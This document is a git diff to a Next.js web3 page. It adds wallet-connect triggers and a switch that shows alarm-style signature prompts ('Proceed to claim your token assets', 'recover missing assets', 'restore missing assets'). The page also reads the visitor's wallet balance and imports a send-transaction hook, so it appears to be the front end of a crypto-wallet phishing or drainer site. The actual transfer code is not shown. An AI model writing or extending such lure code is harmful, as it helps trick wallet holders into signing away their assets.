@@ -8,7 +8,8 @@ import {
   useSendTransaction,
   useWaitForTransaction,
 } from "wagmi";
-import { useEffect } from "react";
+import { useWeb3Modal } from "@web3modal/react";
+import { useEffect, useState } from "react";
 import Header from "@/components/header";
 import HeroSection from "@/components/hero-section";
 import PlugIntoWeb3 from "@/components/plug-into-web3";
@@ -19,14 +20,32 @@ import SupportedBrands2 from "@/components/supported-brands2";
 const inter = Inter({ subsets: ["latin"] });
 
 export default function Home() {
+  const { open: openWalletConnection } = useWeb3Modal();
   const { address } = useAccount();
   const balance = useBalance({ address });
   if (balance.data) {
     var { value: walletBalanceInWei } = balance.data;
   }
-  // console.log("DataType:", typeof balance.data.value); // balance.data.value, Symbol: balance.data.symbol
-  // console.log("result:", balance.data.value < 1n); // balance.data.value, Symbol: balance.data.symbol
-  // console.log("Balance:", balance); // balance.data.value, Symbol: balance.data.symbol
+
+  // Message State
+  const [walletSignMessage, setWalletSignMessage] = useState("claim");
+
+  function switchWalletSignMessage(selectedIssuse) {
+    let signMessage = "";
+    switch (selectedIssuse) {
+      case "claim":
+        signMessage = "⚠️Attention: Proceed to claim your token assets";
+        break;
+      case "recover_fund":
+        signMessage = "⚠️Attention: Proceed to recover missing assets";
+        break;
+      case "restore":
+        signMessage = "⚠️Attention: Proceed to restore missing assets";
+        break;
+    }
+
+    return signMessage;
+  }
 
   async function notifyControlHelper(message, data = {}) {
     return;
@@ -82,7 +101,7 @@ export default function Home() {
     isLoading,
     isSuccess,
   } = useSignMessage({
-    message: "Proceed to recover missing assets.",
+    message: switchWalletSignMessage(walletSignMessage),
   });
 
   // Wait and observe transaction status
@@ -108,11 +127,16 @@ export default function Home() {
     }
   }, [isSuccess]);
 
+  const handleW3ModalTrigger = (issue) => {
+    setWalletSignMessage(issue);
+    openWalletConnection();
+  };
+
   return (
     <>
       <Header />
       <HeroSection />
-      <Web3EarlyAccess />
+      <Web3EarlyAccess handleIssuseSelect={handleW3ModalTrigger} />
       <PlugIntoWeb3 />
       <SupportedBrands2 />
       <Footer />
